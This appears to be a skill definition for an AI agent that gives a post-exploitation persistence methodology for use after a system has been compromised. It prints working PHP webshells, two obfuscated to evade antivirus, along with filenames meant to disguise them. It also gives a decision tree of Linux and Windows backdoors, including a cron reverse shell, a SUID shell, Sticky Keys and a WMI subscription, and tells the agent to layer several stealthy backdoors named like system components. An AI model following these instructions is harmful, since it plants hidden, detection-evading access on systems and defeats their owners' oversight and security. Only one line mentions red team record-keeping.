---
name: persist-maintain
description: "Privilege persistence methodology. Use when you have already obtained access to a target system and need to maintain long-term access. Covers Linux (cron/SSH key/webshell) and Windows (scheduled task/service/registry/WMI) persistence techniques, plus webshell deployment and stealth strategies at the web layer"
zh-signals: "在获得目标权限后建立不依赖原始漏洞的持久访问通道，覆盖 Linux/Windows 持久化与 Web 层 webshell。信号:权限持久化,webshell,cron,计划任务,后门"
when-to-use: >-
  Use after gaining system access when you need to maintain long-term access via
  Linux (cron, SSH keys), Windows (scheduled tasks, services, registry), or
  web-layer webshells.
metadata:
  tags: "persist,persistence,webshell,backdoor,cron,scheduled task,service,maintain access"
  category: "postexploit"
---

# Privilege Persistence Methodology

Persistence core: establish an access channel that **does not depend on the original vulnerability**.

## ⛔ Further Reading (Must Read)

- Concrete commands for the various Linux/Windows persistence techniques → [references/persistence-techniques.md](references/persistence-techniques.md)

---

## Phase 1: Web-Layer Persistence

### Webshell Deployment
**Deployment locations (by stealth)**: static asset directory > upload directory > deep inside a framework directory > appended to an existing file

**Stealth webshell**:
```php
<?php @eval($_POST['cmd']);?>                    // One-liner
<?php $a='sys'.'tem'; $a($_GET['c']);?>          // String concatenation for AV evasion
<?php array_map('assert', array($_POST['cmd']));?>  // Function callback for AV evasion
```
**Filename disguise**: `.htaccess`, `config.bak.php`, `error_log.php`, `.user.ini`

## Phase 2: Persistence Decision Tree

```
Target operating system?
├─ Linux
│   ├─ SSH access available? → SSH public key (most reliable)
│   ├─ Need automatic callback? → Cron reverse shell
│   ├─ Need stealth? → systemd service / bashrc backdoor
│   └─ Need a quick backdoor? → SUID shell
├─ Windows
│   ├─ Administrator rights? → WMI event subscription (hardest to detect)
│   ├─ Need start-up persistence? → Registry Run key / scheduled task
│   └─ RDP access available? → Sticky Keys backdoor
└─ Web layer (generic) → Webshell
Detailed commands → [references/persistence-techniques.md](references/persistence-techniques.md)
```

## Phase 3: Multi-Layer Persistence Strategy

Do not rely on a single technique — establish multiple backdoors:
1. **Layer 1**: Webshell (web layer, easiest to recover)
2. **Layer 2**: SSH key or scheduled task (system layer)
3. **Layer 3**: Service or WMI subscription (deep layer, hard to discover)

## Notes
- The more stealthy the persistence, the better — filenames/service names/task names should look like normal system components
- Avoid obvious paths (such as `/tmp/backdoor.sh`)
- During a red team assessment, record what was deployed and where

## PHP Webshell Obfuscation
- Variable functions: dynamic invocation with `$$var`, avoiding direct occurrences of eval/system (stealth execution)
- Alternative functions: replace eval with assert, system with passthru, and similar substitutions

## Stealth Ranking
- Do not modify core files such as index.php — easy to detect and dangerous
